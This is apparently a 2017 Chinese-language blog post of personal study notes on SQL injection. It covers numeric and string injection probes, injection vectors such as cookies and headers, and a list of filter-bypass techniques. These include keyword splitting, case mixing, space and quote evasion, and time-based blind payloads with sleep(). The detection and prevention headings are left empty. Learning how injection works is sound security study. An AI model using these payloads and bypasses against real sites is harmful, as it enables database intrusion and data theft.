Title: SQL注入记录
Date: 2017-05-22 13:20
Modified: 2017-05-22 13:20
Category: 安全
Tags: SQLI
Slug: G11
Authors: nJcx
Summary: 记录一下学习SQL注入的心路

#### 原理

没有过滤敏感字符，绑定变量，导致攻击者可以通过sql灵活多变的语法，构造精心巧妙的语句，不择手段，达成目的，或者通过系统报错，返回对自己有用的信息。

#### 数字型注入

http://www.test.com/test.php?id=8

我们通过get 传入 id为8的参数，如果对id 没有过滤，那么id就可能传入任何参数，底层的对应的SQL如下

select * from table where id=8

先加个 '，看看是否正常，

```bash

http://www.test.com/test.php?id=8 and 1=1
select * from table where id=8 and 1=1


http://www.test.com/test.php?id=8 and 1=2
select * from table where id=8 and 1=2

```
看看加上 and 1=2 是否正常，如果出现异常，可能出现SQL注入漏洞

#### 字符型注入
http://www.test.com/test.php?user=njcx

select * from table where user='njcx'

字符型注入跟数字型注入的区别在字符型注入需要闭合,参数变了，"njcx' and 1=1--"

当然，也可以出现双闭合

```bash

http://www.test.com/test.php?user=njcx' and 1=1-- 
select * from table where user='njcx' and 1=1--'

http://www.test.com/test.php?user=njcx' and 1=2-- 
select * from table where user='njcx' and 1=2--'
```
看看加上 and 1=2 是否正常，如果出现异常，可能出现SQL注入漏洞，
#### 注入方式
SQL注入的分类

- 联合查询
- 基于错误回显
- sql盲注（布尔和时间）

SQL注入方式的分类

- get 和 post

- 基于user-agent

- 基于feferer

- 基于cookie

#### 检测


#### 绕过

（下面部分内容来自互联网）

- 对于关键字的绕过
	- 注释符绕过:uni/**/on se/**/lect
	- 大小写绕过:UniOn SeleCt
	- 双关键字绕过:ununionion seselectlect
	- <>绕过:unio<>n sel<>ect(有些网站为了防止xss注入,所以过滤了<>)
	- 对于and,or的绕过其实还可以尝试一下&&,||,异或注入

- 对特殊字符的绕过
	- 对空格的绕过:

			两个空格代替一个,用tab键代替空格
	
			/**/ %20 %09 %0a
	
	
			利用空格绕过:很多关键字都可以写成带括号的形式select(),or()
	
			特殊函数中的空格绕过:ascii(mid(xxfrom(1))) ascii(substr(xxfrom(1)))
	- 对单引号的绕过:
			
			 十六进制绕过(针对需要输入表名的时候 'user'=>0x7573657273)
			 substr(x,1,1),mid(x,1,1)=>substr(x from 1 for 1) mid(x from 1 for 1)

	- 对逗号的绕过：
	
			limit 0,1=> limit 0 offset 1
			
			join(本身是用来连接两个表单的,所以join一定是要放在from后面放表单的位置):
			
			union select 1,2 =>
			
			union select * from (select 1)a join (select 2)b
			
			select case when (条件) then (代码1) else (代码2) end 可以对应上if(条件,代码1,代码2)
			
			if(substring((select user()) from 1 for 1)='e',sleep(5),1)
			
			可以变为
			
			select case when substring((select user()) from 1 for 1)='e' then sleep(5) else 1 end

	- 等号的绕过:

			利用<>(即不等于号)绕过
			
			利用like绕过
			
			利用greatest()绕过(greatest(a,b)返回较大的那个数)
			
			?id=' or 1 like 1
			
			?id=' or 1 <> 1
			
			?id=' union select greatest(substr((select user()),1,1),95)


#### 防范